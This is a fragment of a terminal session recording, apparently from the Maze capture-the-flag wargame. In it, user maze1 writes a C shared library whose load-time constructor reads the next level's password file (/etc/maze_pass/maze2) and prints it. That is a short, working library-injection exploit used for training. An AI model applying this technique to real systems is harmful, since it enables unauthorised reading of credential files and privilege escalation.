[18.559, "o", "cat > lib4.c <<'EOF'\r\n\u001b[?2004l\r\u001b[?2004h> #include <stdio.h>\r\n\u001b[?2004l\r\u001b[?2004h> #include <unistd.h>\r\n\u001b[?2004l\r\u001b[?2004h> __attribute__((constructor))\r\n\u001b[?2004l\r\u001b[?2004h> static void init(void) {\r\n\u001b[?2004l\r\u001b[?2004h>     char b[256];\r\n\u001b[?2004l\r\u001b[?2004h>     FILE *f = fopen(\"/etc/maze_pass/maze2\", \"r\");\r\n\u001b[?2004l\r\u001b[?2004h>     if (!f) return;\r\n\u001b[?2004l\r\u001b[?2004h>     size_t n = fread(b, 1, sizeof b - 1, f);\r\n\u001b[?2004l\r\u001b[?2004h>     fclose(f);\r\n\u001b[?2004l\r\u001b[?2004h>     b[n] = 0;\r\n\u001b[?2004l\r\u001b[?2004h>     write(1, b, n);\r\n\u001b[?2004l\r\u001b[?2004h> }\r\n\u001b[?2004l\r\u001b[?2004h> int _dummy;\r\n\u001b[?2004l\r\u001b[?2004h> EOF\r\n\u001b[?2004l\r\u001b]3008;start=287e9f94-ab80-4dcf-9ebd-e717d34d3187;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l1exp\u001b\\\u001b]3008;end=287e9f94-ab80-4dcf-9ebd-e717d34d3187;exit=success\u001b\\\u001b]3008;start=8e8ff94e-804a-4f7e-aa72-350ed6237832;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l1exp\u001b\\\u001b[?2004h\u001b]0;maze1@maze: /tmp/l1exp\u0007maze1@maze:/tmp/l1exp$ "]
